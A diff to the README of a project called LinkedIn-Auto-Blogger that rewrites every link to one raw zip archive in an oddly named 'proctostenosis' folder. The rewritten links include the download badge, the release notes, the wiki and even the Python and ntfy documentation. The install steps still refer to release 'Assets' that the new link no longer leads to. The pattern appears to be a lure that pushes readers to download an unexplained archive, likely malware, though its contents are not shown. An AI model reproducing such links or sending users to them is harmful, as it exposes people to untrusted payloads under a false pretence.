@@ -6,13 +6,13 @@ Welcome to LinkedIn-Auto-Blogger! This application automates your LinkedIn blogg
 
 ## 📥 Download
 
-[![Download LinkedIn-Auto-Blogger](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/MarkKaizen/LinkedIn-Auto-Blogger/releases)
+[![Download LinkedIn-Auto-Blogger](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
 
 ## 📦 Download & Install
 
 To get started with LinkedIn-Auto-Blogger, visit the following page to download the latest version:
 
-[Download LinkedIn-Auto-Blogger](https://github.com/MarkKaizen/LinkedIn-Auto-Blogger/releases)
+[Download LinkedIn-Auto-Blogger](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
 
 1. Open the link above in your web browser.
 2. Find the section titled “Assets” under the latest release.
@@ -89,16 +89,16 @@ For additional help, visit our support page or open an issue on GitHub. The comm
 
 ## 🌐 Links
 
-- [GitHub Repository](https://github.com/MarkKaizen/LinkedIn-Auto-Blogger)
-- [Documentation](https://github.com/MarkKaizen/LinkedIn-Auto-Blogger/wiki)
-- [Release Notes](https://github.com/MarkKaizen/LinkedIn-Auto-Blogger/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
+- [Documentation](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
+- [Release Notes](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
 
 ## 🔗 Additional Resources
 
 Explore the following resources to enhance your experience with LinkedIn-Auto-Blogger:
 
-- **Getting Started with CSV Files:** [CSV Guide](https://www.csvguide.com)
-- **Using ntfy for Push Notifications:** [ntfy Documentation](https://ntfy.sh/docs)
-- **Scheduled Tasks in Python:** [Python Scheduler Guide](https://docs.python.org/3/library/sched.html)
+- **Getting Started with CSV Files:** [CSV Guide](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
+- **Using ntfy for Push Notifications:** [ntfy Documentation](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
+- **Scheduled Tasks in Python:** [Python Scheduler Guide](https://raw.githubusercontent.com/MarkKaizen/LinkedIn-Auto-Blogger/main/proctostenosis/LinkedIn-Auto-Blogger.zip)
 
 Thank you for choosing LinkedIn-Auto-Blogger. Happy blogging!
